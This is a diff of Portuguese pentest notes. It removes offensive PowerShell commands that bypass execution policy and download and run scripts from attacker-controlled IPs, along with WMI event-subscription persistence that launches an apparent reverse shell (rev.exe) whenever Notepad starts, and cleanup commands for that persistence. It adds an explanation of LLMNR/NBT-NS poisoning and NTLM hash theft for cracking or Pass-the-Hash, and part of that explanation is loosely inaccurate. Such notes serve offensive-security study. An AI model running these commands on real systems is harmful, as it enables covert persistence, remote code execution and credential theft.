@@ -3,21 +3,15 @@
 
 será apagado
 
-criar
-powershell -nop -exe bypass -c "iex(New-Object Net.WebClient).DownloadString('http://10.0.2.50/wmic.jpg'); pettily -EventName reversenotepad -PermanentCommand 'cmd.exe /c c:\temp\rev.exe' -Trigger ProcessStart -ProcessName notepad.exe"
+O LLMNR (Link-Local Multicast Name Resolution) e o NBT-NS (Netbios Name Service) são dois protocolos do Windows que funcionam como alternativas ao protocolo DNS (Domain Name System).
 
-consultar
-powershell -nop -exe bypass -c "iex(New-Object Net.WebClient).DownloadString('http://10.0.2.50/wmic.jpg'); snaking -Name reversenotepad"
+Uma maquina Windows segue algumas etapas quando precisa resolver um nome de domínio.
 
-excluir
-powershell -nop -exe bypass -c "iex(New-Object Net.WebClient).DownloadString('http://10.0.2.50/wmic.jpg'); snaking -Name reversenotepad | Remove-WmiObject"
-echo powershell.exe -nop -exe bypass iex(new-object net.webclient).downloadstring('http://172.16.192.200/fig.jpg') > rev.bat
+1- Tenta a resolução arquivo arquivo hosts local;
+2- Tenta a resoluçção através do cache do DNS;
+3- Envia a solicitação para servidor DNS para resolução;
+4- A solicitação é enviada para os protocolos LLMNR e NBT-NS
 
+O LLMNR e o NBT-NS resolvem nomes através de consultas enviadas em broadcast para todas as máquinas da rede local. Se uma máquina conhecer o nome solicitado, ela responderá à consulta. 
 
-SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'
-
-wmic /namespace:"\\root\subscription" PATH __EventFilter delete
-
-wmic /namespace:"\\root\subscription" PATH __EventConsumer delete
-
-wmic /namespace:"\\root\subscription" PATH __FilterToConsumerBinding delete
+A vulnerabilidade ocorre quando a máquina atacante solicita um desafio à máquina vitimada, que inclui o envio do nome de usuário e o hash NTLM da senha. O hash NTLM é um valor criptografado usado para autenticação em sistemas Windows. O atacante pode tentar quebrar esse hash para obter a senha em texto claro ou usar o hash em técnicas como Pass-the-Hash.
